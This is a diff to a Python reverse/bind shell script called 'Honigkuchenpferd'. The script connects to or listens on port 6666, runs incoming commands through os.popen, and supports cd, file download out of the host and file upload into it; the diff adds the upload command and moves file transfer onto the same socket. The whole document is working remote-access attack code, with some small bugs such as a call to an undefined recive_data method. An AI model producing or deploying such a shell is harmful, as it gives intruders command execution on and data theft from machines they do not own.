@@ -6,11 +6,11 @@
 import os
 import sys
 import socket
+import time
 
 IP='127.0.0.1'
 
 REVERSE=True        #False=bind shell
-
 class tcp_socket():
 
     def listen_on(self, port):
@@ -29,43 +29,51 @@ class tcp_socket():
 
     def send_data(self, data):
         self.conn.sendall(data)
-        
-    def send_file(self, filename):
+
+    def send_all(self, filename):
         self.conn.sendall(open(filename, "rb").read())
-        self.conn.close()
+
+    def recive_all(self):
+        self.data = b''
+        while True:
+            self.data_chunk = self.conn.recv(1024)
+            #if self.data_chunk:
+            if (len(self.data_chunk) == 1024):
+                self.data += self.data_chunk
+            else:
+                self.data += self.data_chunk
+                break
+        return self.data
 
     def close(self):
         self.conn.close()
 
         
-def get_conn(PORT):
-    x = tcp_socket()
+#send and recive file      
+def recive_file(conn, file_name):
+    data = conn.recive_all()
+    with open(file_name, 'wb') as f:
+        f.write(data)
+    conn.send_data(bytes("OK", 'utf-8'))
 
-    if REVERSE == True:
-        x.connect_to(IP, PORT)
-    else:
-        x.listen_on(PORT)
+def send_file(conn, file_name):
+        conn.send_all(file_name)
+        if str(conn.recive_data(), 'utf-8') == 'OK':
+            #print("OK")
+            pass
 
-    return(x)
-        
-    
+
 def easy_exec(cmd):
     try:
         return os.popen(cmd).read()
     except:
         return "input error"
 
-    
 def easy_chdir(s):
     try:
         os.chdir(s)
     except:
         pass
-    
-    
-def easy_file_send(filename):
-    xf = get_conn(6667)
-    xf.send_file(filename)
 
         
 # python2.7 and python3
@@ -90,33 +98,30 @@ def easy_cmd(conn):
     if cmd.startswith('cd'):
         easy_chdir(cmd[3:len(cmd) - 1])
     elif cmd.startswith('download'):
-        easy_file_send(cmd[9:len(cmd)-1], IP)
+        send_file(conn, cmd[9:len(cmd)-1])
+    elif cmd.startswith('upload'):
+        recive_file(conn, cmd[7:len(cmd)-1])
     elif cmd == "exit\n":
         conn.close()
         exit()
     else:
-        conn.send_data(to_bytes(easy_exec(cmd)))
+        conn.send_data(to_bytes(easy_exec(cmd)+'\n'))
 
         
-def honigkuchen():
-    conn = get_conn(6666)
-    conn.send_data(to_bytes('hello from the other side :)\n'))
-    
+def honigkuchen(conn):
     while 1:
         conn.send_data(to_bytes(str('[Honigkuchenpferd ' + os.getcwd() + '] ')))
         easy_cmd(conn)
-        
+        time.sleep(0.2)
         
 if __name__ == '__main__':
-    honigkuchen()
-    
-'''
-    if len(sys.argv) > 3:
-        if sys.argv[1] == "-r":
-            reverse_shell(sys.argv[2], sys.argv[3])
-        if sys.argv[1] == "-b":
-            bind_shell(sys.argv[2])
-'''
+    x = tcp_socket()
 
+    if REVERSE == True:
+        x.connect_to(IP, 6666)
+    else:
+        x.listen_on(6666)
+
+    honigkuchen(x)
 
 
